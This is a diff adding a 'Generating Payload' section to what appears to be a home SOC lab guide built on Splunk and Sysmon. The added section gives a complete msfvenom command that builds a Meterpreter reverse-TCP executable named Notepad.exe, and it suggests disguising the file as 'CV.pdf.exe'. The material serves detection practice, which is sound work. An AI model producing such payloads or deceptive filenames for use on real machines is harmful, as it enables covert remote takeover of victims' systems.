@@ -68,3 +68,9 @@ Copy, paste inputs.conf into the Splunk directory for collecting sysmon logs "C:
 
 ---
 ## Generating Payload
+- Using msfvenom on Kali Linux  
+To list all avaliable payloads we can type "msfvenom -l payloads" into the terminal.  
+The payload used in this SOC lab is "windows/x64/meterpreter_reverse_tcp".  
+We will generate a reverse TCP shellcode from our Windows VM to Kali VM.  
+In the Kali terminal we can use "msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.0.200 lport=4444 -f exe -o Notepad.exe".  
+LHOST = The IP address of your Kali VM, Notepad.exe is our generated filename which can be any name of your choosing eg CV.pdf.exe.  
